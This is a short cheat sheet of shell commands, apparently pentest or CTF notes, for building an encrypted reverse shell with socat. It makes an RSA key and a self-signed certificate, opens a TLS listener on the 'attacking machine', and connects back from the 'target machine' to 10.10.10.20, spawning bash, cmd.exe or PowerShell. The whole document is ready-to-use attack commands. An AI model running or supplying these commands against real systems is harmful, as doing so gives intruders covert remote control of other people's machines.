# create a 2048 bit RSA key with matching cert file
openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
cat shell.key shell.crt > shell.pem

# setup a listener on the attacking machine
socat openssl-listen:80,cert=shell.pem,verify=0 -

# connect to the listener from the target machine
socat openssl:10.10.10.20:80,verify=0 exec:/bin/bash
# use the pipes argument to interface between the unix and windows ways of handling input and output
socat openssl:10.10.10.20:80,verify=0 exec:cmd.exe,pipes
socat openssl:10.10.10.20:80,verify=0 exec:powershell.exe,pipes